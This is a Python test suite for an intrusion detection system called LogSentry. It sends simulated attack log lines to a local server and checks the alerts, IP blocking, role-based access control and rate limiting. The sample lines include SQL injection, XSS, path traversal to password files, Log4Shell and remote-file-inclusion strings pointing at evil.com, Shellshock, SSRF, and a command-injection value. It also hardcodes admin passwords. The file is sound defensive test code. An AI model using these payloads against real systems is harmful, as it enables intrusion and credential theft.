#!/usr/bin/env python3
"""
======================================================================
     LogSentry Full-Stack Attack Simulation Test Suite
======================================================================

Tests ALL detection layers end-to-end via the live FastAPI server:
  1. Authentication & RBAC
  2. Login Rate Limiting
  3. Signature Detection (30 rules)
  4. AI Multi-Brain Detection (7 models)
  5. IP Reputation & Auto-Blocking (IPS)
  6. AI Triage Reports
  7. IPS Gatekeeper Interception
  8. Unblock & Recovery
  9. Model Analytics
 10. Threat Intelligence
"""

import json
import sys
import time

# Fix Windows console encoding
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

import httpx

API_BASE = "http://127.0.0.1:8000"
TIMEOUT = 10.0

# --- ANSI Colors ---
class C:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    CYAN = "\033[96m"
    MAGENTA = "\033[95m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    RESET = "\033[0m"

passed = 0
failed = 0
total = 0


def header(title):
    print(f"\n{C.BOLD}{C.CYAN}{'=' * 70}")
    print(f"  {title}")
    print(f"{'=' * 70}{C.RESET}\n")


def section(title):
    print(f"\n{C.BOLD}{C.MAGENTA}-- {title} {'-' * (55 - len(title))}{C.RESET}")


def check(description, condition, detail=""):
    global passed, failed, total
    total += 1
    if condition:
        passed += 1
        print(f"  {C.GREEN}[PASS]{C.RESET}  {description}")
    else:
        failed += 1
        print(f"  {C.RED}[FAIL]{C.RESET}  {description}")
        if detail:
            print(f"         {C.DIM}{detail}{C.RESET}")


def info(msg):
    print(f"  {C.BLUE}[i]{C.RESET} {C.DIM}{msg}{C.RESET}")


def warn(msg):
    print(f"  {C.YELLOW}[!]{C.RESET} {msg}")


def attack_label(label):
    print(f"\n  {C.BOLD}{C.RED}>>> {label}{C.RESET}")


# ===============================================================
# MAIN TEST RUNNER
# ===============================================================
def main():
    global passed, failed, total

    header("LogSentry Full-Stack Attack Simulation")

    client = httpx.Client(base_url=API_BASE, timeout=TIMEOUT)

    # ----------------------------------------------------------
    # PHASE 0: Server Health Check
    # ----------------------------------------------------------
    section("Phase 0: Server Health Check")

    try:
        r = client.get("/health")
        health = r.json()
        check("Server is online", r.status_code == 200)
        check("Health status is 'ok'", health.get("status") == "ok")
        check("Signature engine loaded", health.get("signature_count", 0) > 0,
              f"Loaded {health.get('signature_count', 0)} signatures")
        info(f"AI Ready: {health.get('ai_ready')} | Brains: {health.get('active_brains', [])}")
        ai_ready = health.get("ai_ready", False)
    except httpx.ConnectError:
        print(f"\n  {C.RED}[FATAL] Cannot connect to {API_BASE}")
        print(f"  Start the server first: python -m uvicorn api:app --port 8000{C.RESET}")
        sys.exit(1)

    # ----------------------------------------------------------
    # PHASE 1: Authentication & RBAC
    # ----------------------------------------------------------
    section("Phase 1: Authentication & RBAC")

    # 1a. Reject unauthenticated access
    r = client.get("/api/alerts")
    check("Unauthenticated /api/alerts returns 401", r.status_code == 401)

    # 1b. Reject bad credentials
    r = client.post("/api/auth/login", json={"username": "admin", "password": "wrongpass"})
    check("Wrong password returns 401", r.status_code == 401)

    # 1c. Login as ADMIN
    r = client.post("/api/auth/login", json={
        "username": "admin",
        "password": "LogSentry@Admin2026!"
    })
    check("Admin login succeeds", r.status_code == 200)
    admin_token = r.json().get("token", "")
    admin_role = r.json().get("role", "")
    check("Admin role is ADMIN", admin_role == "ADMIN")
    admin_headers = {"Authorization": f"Bearer {admin_token}"}

    # 1d. Login as ANALYST
    r = client.post("/api/auth/login", json={
        "username": "analyst",
        "password": "LogSentry@Analyst2026!"
    })
    check("Analyst login succeeds", r.status_code == 200)
    analyst_token = r.json().get("token", "")
    analyst_role = r.json().get("role", "")
    check("Analyst role is ANALYST", analyst_role == "ANALYST")
    analyst_headers = {"Authorization": f"Bearer {analyst_token}"}

    # 1e. RBAC: Analyst cannot ingest logs
    r = client.post("/api/logs", json={"line": "test"}, headers=analyst_headers)
    check("Analyst blocked from log ingestion (403)", r.status_code == 403)

    # 1f. Verify /api/auth/me
    r = client.get("/api/auth/me", headers=admin_headers)
    check("/api/auth/me returns admin profile", r.json().get("username") == "admin")

    # ----------------------------------------------------------
    # PHASE 2: Login Rate Limiting
    # ----------------------------------------------------------
    section("Phase 2: Login Rate Limiting")

    rate_limit_user = "ratelimituser"
    rate_limited = False
    for i in range(6):
        r = client.post("/api/auth/login", json={
            "username": rate_limit_user,
            "password": "bad"
        })
        if r.status_code == 429:
            rate_limited = True
            break

    check("Rate limiter triggers after repeated failures (429)", rate_limited)

    # ----------------------------------------------------------
    # PHASE 3: Signature-Based Attack Detection
    # ----------------------------------------------------------
    section("Phase 3: Signature-Based Attack Detection")

    signature_attacks = [
        {
            "name": "SQL Injection (UNION SELECT)",
            "payload": "45.33.22.11 - GET /products?id=1 UNION SELECT user,pass FROM users HTTP/1.1",
            "expected_type": "SQL Injection",
        },
        {
            "name": "SQL Injection (Boolean OR 1=1)",
            "payload": "45.33.22.12 - GET /login?user=admin' OR 1=1-- HTTP/1.1",
            "expected_type": "SQL Injection",
        },
        {
            "name": "XSS (Script Tag)",
            "payload": '203.0.113.5 - GET /search?q=<script>alert(document.cookie)</script> HTTP/1.1',
            "expected_type": "XSS",
        },
        {
            "name": "XSS (Event Handler)",
            "payload": '203.0.113.6 - GET /page?img=x onerror=alert(1) HTTP/1.1',
            "expected_type": "XSS",
        },
        {
            "name": "Path Traversal (etc/passwd)",
            "payload": "185.200.10.5 - GET /file?path=../../../../etc/passwd HTTP/1.1",
            "expected_type": "Password File Access",
        },
        {
            "name": "Path Traversal (etc/shadow)",
            "payload": "185.200.10.6 - GET /download?f=../../etc/shadow HTTP/1.1",
            "expected_type": "Shadow File Access",
        },
        {
            "name": "Directory Traversal (../../../)",
            "payload": "185.200.10.7 - GET /include?page=../../../etc/hosts HTTP/1.1",
            "expected_type": "Directory Traversal",
        },
        {
            "name": "Command Injection (; cat /)",
            "payload": "10.20.30.40 - GET /ping?host=127.0.0.1; cat /etc/shadow HTTP/1.1",
            "expected_type": "Command Injection",
        },
        {
            "name": "SSH Brute Force",
            "payload": "Nov 23 12:00:01 server sshd: Failed password for root from 185.200.10.1 port 22 ssh2",
            "expected_type": "SSH Brute Force",
        },
        {
            "name": "Invalid User Login",
            "payload": "Nov 23 12:00:02 server sshd: Invalid user hacker from 185.200.10.2 port 22",
            "expected_type": "Invalid User Login",
        },
        {
            "name": "Sudo Abuse",
            "payload": "Nov 23 12:01:01 server sudo: auth failure; logname=root uid=0",
            "expected_type": "Sudo Abuse",
        },
        {
            "name": "Log4Shell Exploit",
            "payload": '88.99.44.55 - GET /api?token=${jndi:ldap://evil.com/exploit} HTTP/1.1',
            "expected_type": "Log4Shell",
        },
        {
            "name": "Shellshock Vulnerability",
            "payload": '88.99.44.56 - GET /cgi-bin/test.cgi HTTP/1.1 () { :; }; /bin/cat /etc/passwd',
            "expected_type": "Shellshock",
        },
        {
            "name": "Git Config Exposure",
            "payload": "91.92.93.94 - GET /.git/config HTTP/1.1",
            "expected_type": "Git Config Exposure",
        },
        {
            "name": "Env File Exposure",
            "payload": "91.92.93.95 - GET /.env HTTP/1.1",
            "expected_type": "Env File Exposure",
        },
        {
            "name": "SSH Key Scan",
            "payload": "91.92.93.96 - GET /home/admin/.ssh/id_rsa HTTP/1.1",
            "expected_type": "SSH Key Scan",
        },
        {
            "name": "Remote File Inclusion (RFI)",
            "payload": "77.88.99.10 - GET /page?file=http://evil.com/shell.php HTTP/1.1",
            "expected_type": "Remote File Inclusion",
        },
        {
            "name": "Null Byte Injection",
            "payload": "77.88.99.11 - GET /download?file=../../../etc/passwd%00.jpg HTTP/1.1",
            "expected_type": "Null Byte Injection",
        },
        {
            "name": "AWS Metadata SSRF",
            "payload": "77.88.99.12 - GET /proxy?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1",
            "expected_type": "AWS Metadata",
        },
        {
            "name": "Nmap Scanner Detection",
            "payload": "200.100.50.25 - GET / HTTP/1.1 Nmap Scripting Engine",
            "expected_type": "Nmap Scanner",
        },
        {
            "name": "Nikto Scanner Detection",
            "payload": "200.100.50.26 - GET /admin/ HTTP/1.1 Nikto/2.1.6",
            "expected_type": "Nikto Scanner",
        },
        {
            "name": "Sqlmap Tool Detection",
            "payload": "200.100.50.27 - GET /vuln?id=1 HTTP/1.1 sqlmap/1.7",
            "expected_type": "Sqlmap Tool",
        },
        {
            "name": "WordPress Login Bruteforce",
            "payload": "150.60.70.80 - POST /wp-login.php HTTP/1.1",
            "expected_type": "WordPress Login Bruteforce",
        },
        {
            "name": "Base64 Encoded Payload",
            "payload": '150.60.70.81 - GET /exec?cmd=eval(base64_decode("bWFsd2FyZQ==")) HTTP/1.1',
            "expected_type": "Base64 Encoded Payload",
        },
        {
            "name": "Python Bot Detection",
            "payload": "150.60.70.82 - GET /api/data HTTP/1.1 python-requests/2.31.0",
            "expected_type": "Python Bot",
        },
    ]

    sig_detected = 0
    sig_triage = 0

    for attack in signature_attacks:
        attack_label(attack["name"])
        r = client.post("/api/logs", json={"line": attack["payload"]}, headers=admin_headers)
        data = r.json()
        alerts = data.get("alerts", [])
        detected = len(alerts) > 0

        if detected:
            sig_detected += 1
            alert = alerts[0]
            type_match = attack["expected_type"].lower() in alert.get("Type", "").lower()
            check(f"Detected as '{alert.get('Type')}'", type_match,
                  f"Expected substring: '{attack['expected_type']}'")

            # Check AI Triage Report
            ai_report = alert.get("ai_report")
            has_triage = (
                isinstance(ai_report, dict)
                and "analysis" in ai_report
                and "mitigations" in ai_report
                and "firewall_cmd_linux" in ai_report
                and "firewall_cmd_windows" in ai_report
            )
            if has_triage:
                sig_triage += 1
            check(f"AI Triage report attached", has_triage)
            if has_triage:
                info(f"Agent Mode: {ai_report.get('agent_mode', 'N/A')}")
                info(f"Analysis: {ai_report['analysis'][:100]}...")
                info(f"Mitigations: {len(ai_report['mitigations'])} steps")
        else:
            check(f"Detected attack", False, f"No alerts returned for: {attack['name']}")

    print(f"\n  {C.BOLD}Signature Summary: {sig_detected}/{len(signature_attacks)} attacks detected, "
          f"{sig_triage}/{sig_detected} triage reports attached{C.RESET}")

    # ----------------------------------------------------------
    # PHASE 4: AI Multi-Brain Detection
    # ----------------------------------------------------------
    section("Phase 4: AI Multi-Brain Detection")

    if not ai_ready:
        warn("AI Brains not loaded -- skipping AI detection tests.")
        warn("Train models with: python trainer.py --type all")
    else:
        ai_attacks = [
            {
                "name": "AI-WEB: Web Brute Force Flow",
                "payload": "42.42.42.42 - GET /login?dport=80&dur=500&fpkts=200&bpkts=5&fwd_len=15000&bwd_len=200&fwd_max=1500&fwd_pkt_mean=75&bwd_max=200&bwd_pkt_mean=40&byte_rate=30000&pkt_rate=400&iat_mean=2.5&iat_std=0.5&iat_min=0&fwd_iat_mean=2.5&fwd_iat_min=0&syn_cnt=200&rst_cnt=0&init_win_fwd=8192 HTTP/1.1",
                "expected_brain": "AI-WEB",
            },
            {
                "name": "AI-DOS: DoS Flood Pattern",
                "payload": "42.42.42.43 - GET /flood?dport=80&dur=100&fpkts=50000&bpkts=2&fwd_len=2500000&bwd_len=100&fwd_max=1500&fwd_pkt_mean=50&bwd_max=100&bwd_pkt_mean=50&byte_rate=25000000&pkt_rate=500000&iat_mean=0.002&iat_std=0.001&iat_min=0&fwd_iat_mean=0.002&fwd_iat_min=0&syn_cnt=50000&rst_cnt=0&init_win_fwd=1024 HTTP/1.1",
                "expected_brain": "AI-DOS",
            },
            {
                "name": "AI-DDOS: DDoS LOIC Pattern",
                "payload": "42.42.42.44 - GET /target?dport=80&dur=50&fpkts=100000&bpkts=1&fwd_len=5000000&bwd_len=50&fwd_max=1500&fwd_pkt_mean=50&bwd_max=50&bwd_pkt_mean=50&byte_rate=100000000&pkt_rate=2000000&iat_mean=0.00005&iat_std=0.00001&iat_min=0&fwd_iat_mean=0.00005&fwd_iat_min=0&syn_cnt=100000&rst_cnt=0&init_win_fwd=512 HTTP/1.1",
                "expected_brain": "AI-DDOS",
            },
            {
                "name": "AI-RECON: Port Scan Pattern",
                "payload": "42.42.42.45 - GET /scan?dport=22&dur=10&fpkts=1&bpkts=1&fwd_len=44&bwd_len=44&fwd_max=44&fwd_pkt_mean=44&bwd_max=44&bwd_pkt_mean=44&byte_rate=8.8&pkt_rate=0.2&iat_mean=50000&iat_std=0&iat_min=50000&fwd_iat_mean=0&fwd_iat_min=0&syn_cnt=1&rst_cnt=1&init_win_fwd=1024 HTTP/1.1",
                "expected_brain": "AI-RECON",
            },
        ]

        ai_detected = 0
        for attack in ai_attacks:
            attack_label(attack["name"])
            r = client.post("/api/logs", json={"line": attack["payload"]}, headers=admin_headers)
            data = r.json()
            alerts = data.get("alerts", [])

            if alerts:
                ai_detected += 1
                for alert in alerts:
                    brain = alert.get("Type", "Unknown")
                    confidence = "N/A"
                    details = alert.get("Details", "")
                    if "Confidence:" in details:
                        try:
                            confidence = details.split("Confidence:")[1].split("%")[0].strip() + "%"
                        except Exception:
                            pass
                    check(f"Brain fired: {brain} (Confidence: {confidence})", True)

                    ai_report = alert.get("ai_report")
                    if isinstance(ai_report, dict):
                        info(f"Triage: {ai_report.get('analysis', '')[:90]}...")
            else:
                check(f"AI brain detected attack", False, f"No alerts for {attack['name']}")

        print(f"\n  {C.BOLD}AI Brain Summary: {ai_detected}/{len(ai_attacks)} attack patterns detected{C.RESET}")

    # ----------------------------------------------------------
    # PHASE 5: IP Reputation & Auto-Blocking
    # ----------------------------------------------------------
    section("Phase 5: IP Reputation & Auto-Blocking (IPS)")

    # IP 45.33.22.11 sent a CRITICAL SQL Injection -> score should be >= 100 -> auto-blocked
    r = client.get("/api/blocked-ips", headers=admin_headers)
    blocked_list = r.json()
    check("Blocked IPs endpoint returns list", isinstance(blocked_list, list))

    blocked_ips = [entry["ip"] for entry in blocked_list]
    check("SQL Injection attacker 45.33.22.11 auto-blocked",
          "45.33.22.11" in blocked_ips,
          f"Blocked IPs: {blocked_ips[:10]}")

    info(f"Total blocked IPs: {len(blocked_ips)}")
    for entry in blocked_list[:5]:
        info(f"  {entry['ip']} -- Score: {entry['score']}, Last: {entry.get('updated_at', 'N/A')}")

    # ----------------------------------------------------------
    # PHASE 6: IPS Gatekeeper Interception
    # ----------------------------------------------------------
    section("Phase 6: IPS Gatekeeper Interception")

    # Send a benign log from a blocked IP -- should be intercepted
    blocked_ip = "45.33.22.11"
    r = client.post("/api/logs", json={
        "line": f"{blocked_ip} - GET /totally-normal-page HTTP/1.1 200"
    }, headers=admin_headers)
    data = r.json()
    alerts = data.get("alerts", [])

    if alerts:
        alert_type = alerts[0].get("Type", "")
        check("Blocked IP intercepted by IPS gate",
              "Blocked" in alert_type or "IPS" in alert_type,
              f"Alert type: {alert_type}")
        check("IPS suppressed signature/AI checks",
              "Suppressed" in alerts[0].get("Details", "") or "blocked" in alerts[0].get("Details", "").lower())
    else:
        check("IPS gate intercepted blocked IP traffic", False, "No alerts returned")

    # ----------------------------------------------------------
    # PHASE 7: Threat Intelligence
    # ----------------------------------------------------------
    section("Phase 7: Threat Intelligence")

    r = client.get("/api/threat-intel", headers=admin_headers)
    check("Threat intel endpoint returns data", r.status_code == 200)
    reputations = r.json()
    check("Reputation records exist", len(reputations) > 0, f"Total IPs tracked: {len(reputations)}")

    # Show top 5 threat scores
    for rep in reputations[:5]:
        status = f"{C.RED}BLOCKED{C.RESET}" if rep.get("blocked") else f"{C.GREEN}TRACKED{C.RESET}"
        info(f"  {rep['ip']:20s} Score: {rep['score']:>7.1f}  {status}")

    # ----------------------------------------------------------
    # PHASE 8: Admin Unblock & Recovery
    # ----------------------------------------------------------
    section("Phase 8: Admin Unblock & Recovery")

    # 8a. Analyst cannot unblock
    r = client.post("/api/ips/unblock", json={"ip": blocked_ip}, headers=analyst_headers)
    check("Analyst cannot unblock IPs (403)", r.status_code == 403)

    # 8b. Admin can unblock
    r = client.post("/api/ips/unblock", json={"ip": blocked_ip}, headers=admin_headers)
    check("Admin unblocks IP successfully", r.status_code == 200)
    check("Unblock response confirms IP",
          blocked_ip in r.json().get("message", ""))

    # 8c. Verify IP is no longer in blocked list
    r = client.get("/api/blocked-ips", headers=admin_headers)
    blocked_after = [entry["ip"] for entry in r.json()]
    check(f"IP {blocked_ip} removed from blocked list",
          blocked_ip not in blocked_after)

    # ----------------------------------------------------------
    # PHASE 9: Firewall IP Validation (Injection Prevention)
    # ----------------------------------------------------------
    section("Phase 9: Firewall IP Validation (Injection Prevention)")

    # 9a. Valid IP format should be accepted (may fail on execution but IP is valid)
    r = client.post("/api/ips/deploy-firewall", json={"ip": "10.20.30.40"}, headers=admin_headers)
    check("Valid IP accepted by firewall endpoint", r.status_code == 200)

    # 9b. Command injection attempt should be rejected with 400
    r = client.post("/api/ips/deploy-firewall", json={"ip": "1.2.3.4;rm -"}, headers=admin_headers)
    check("Command injection payload rejected (400)", r.status_code in [400, 422],
          f"Status: {r.status_code}, Body: {r.text[:100]}")

    # ----------------------------------------------------------
    # PHASE 10: Model Analytics
    # ----------------------------------------------------------
    section("Phase 10: Model Analytics")

    r = client.get("/api/model-analytics", headers=admin_headers)
    check("Model analytics endpoint returns data", r.status_code == 200)
    analytics = r.json()
    check("Analytics contains brains_loaded count", "brains_loaded" in analytics)
    check("Analytics contains model data", "analytics" in analytics)

    model_names = list(analytics.get("analytics", {}).keys())
    info(f"Models in analytics: {model_names}")

    for name, data in analytics.get("analytics", {}).items():
        trained = data.get("trained", False)
        status = f"{C.GREEN}TRAINED{C.RESET}" if trained else f"{C.YELLOW}NOT TRAINED{C.RESET}"
        if trained:
            acc = data.get("accuracy", 0)
            f1 = data.get("f1_score", 0)
            info(f"  {name:15s} {status}  Accuracy: {acc:.4f}  F1: {f1:.4f}")
        else:
            info(f"  {name:15s} {status}")

    # ----------------------------------------------------------
    # PHASE 11: Alert History Verification
    # ----------------------------------------------------------
    section("Phase 11: Alert History Verification")

    r = client.get("/api/alerts?limit=500&newest_first=true", headers=admin_headers)
    check("Alerts endpoint returns data", r.status_code == 200)
    alert_data = r.json()
    alert_count = alert_data.get("count", 0)
    check(f"Total alerts recorded: {alert_count}", alert_count > 0)

    # Count unique attack types
    alert_types = set()
    alert_ips = set()
    triage_count = 0
    for alert in alert_data.get("alerts", []):
        alert_types.add(alert.get("Type", "Unknown"))
        alert_ips.add(alert.get("Source IP", "Unknown"))
        if isinstance(alert.get("ai_report"), dict):
            triage_count += 1

    info(f"Unique attack types detected: {len(alert_types)}")
    info(f"Unique attacker IPs: {len(alert_ips)}")
    info(f"Alerts with AI triage reports: {triage_count}/{alert_count}")

    for t in sorted(alert_types):
        info(f"  -> {t}")

    # ----------------------------------------------------------
    # PHASE 12: Batch Log Ingestion
    # ----------------------------------------------------------
    section("Phase 12: Batch Log Ingestion")

    batch_lines = [
        "99.99.99.1 - GET /api?q=UNION SELECT credit_card FROM payments HTTP/1.1",
        "99.99.99.2 - GET /search?q=<script>document.location='http://evil.com'</script> HTTP/1.1",
        "99.99.99.3 - Normal benign traffic GET /index.html HTTP/1.1",
    ]
    r = client.post("/api/logs/batch", json={"lines": batch_lines}, headers=admin_headers)
    check("Batch ingestion succeeds", r.status_code == 200)
    batch_data = r.json()
    check(f"Batch processed {batch_data.get('line_count', 0)} lines",
          batch_data.get("line_count") == len(batch_lines))
    check(f"Batch detected {batch_data.get('alert_count', 0)} alerts",
          batch_data.get("alert_count", 0) >= 2)

    # ----------------------------------------------------------
    # PHASE 13: Session Logout
    # ----------------------------------------------------------
    section("Phase 13: Session Logout")

    r = client.post("/api/auth/logout", headers=admin_headers)
    check("Logout succeeds", r.status_code == 200)

    # Verify token is revoked
    r = client.get("/api/alerts", headers=admin_headers)
    check("Old token rejected after logout (401)", r.status_code == 401)

    # ===============================================================
    # FINAL REPORT
    # ===============================================================
    header("SIMULATION RESULTS")

    pct = (passed / total * 100) if total > 0 else 0
    color = C.GREEN if pct >= 90 else (C.YELLOW if pct >= 70 else C.RED)

    print(f"  {C.BOLD}Total Tests:  {total}{C.RESET}")
    print(f"  {C.GREEN}Passed:       {passed}{C.RESET}")
    print(f"  {C.RED}Failed:       {failed}{C.RESET}")
    print(f"  {color}{C.BOLD}Score:        {pct:.1f}%{C.RESET}")
    print()

    if failed == 0:
        print(f"  {C.GREEN}{C.BOLD}* ALL TESTS PASSED -- LogSentry detection pipeline fully operational *{C.RESET}")
    else:
        print(f"  {C.YELLOW}{C.BOLD}! {failed} test(s) failed -- review output above for details{C.RESET}")

    print()
    client.close()
    sys.exit(0 if failed == 0 else 1)


if __name__ == "__main__":
    main()
